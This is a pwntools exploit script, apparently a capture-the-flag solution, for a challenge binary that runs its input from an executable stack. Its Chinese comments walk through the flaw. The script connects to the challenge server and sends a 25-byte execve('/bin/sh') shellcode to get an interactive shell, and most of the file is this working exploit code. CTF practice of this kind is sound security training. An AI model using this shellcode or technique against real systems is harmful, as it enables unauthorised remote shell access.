from pwn import *

context.arch = 'amd64'
context.os = 'linux'

HOST, PORT = 'ctf.adl.tw', 10002   # 使用者已確認的連線資訊

# 本機 Windows 環境沒有 WSL/QEMU，無法原生執行這個 Linux ELF，
# 所以這裡固定打遠端，不走 process() 本地執行那條路。
p = remote(HOST, PORT)

# --- 二進位邏輯（見 shellcode_writeup.md） ---
# char buf[0xd0];              // rbp-0xd0, 208 bytes
# read(0, buf, 0xc8);          // 最多讀 200 bytes 進 buf
# void (*fp)() = buf;
# fp();                        // 直接呼叫 buf -> 把我們的輸入當成機器碼執行！
#
# 這題沒有任何 win function、沒有 execve import，因為它根本不需要：
# 程式會把我們送進去的資料直接當程式碼執行（RWX stack，checksec 顯示
# "Stack: Executable" / "Has RWX segments"），所以我們自己寫一段
# shellcode 塞進去就好，不需要蓋 return address、不需要找 gadget。

# 25 bytes 經典 execve("/bin/sh", NULL, NULL) shellcode：
#   xor rsi, rsi
#   push rsi
#   movabs rdi, 0x68732f6e69622f2f   ; "/bin//sh" (小端序放進暫存器)
#   push rdi
#   mov rdi, rsp                     ; rdi = "/bin//sh" 在 stack 上的位址
#   xor rdx, rdx
#   mov al, 0x3b                     ; syscall number 59 = execve
#   syscall
shellcode = bytes.fromhex('4831f65648bf2f2f62696e2f7368574889e74831d2b03b0f05')
assert len(shellcode) <= 0xc8    # 25 bytes，遠小於 read() 允許的 200 bytes 上限

p.recvuntil(b'!!!')
p.send(shellcode)

p.interactive()
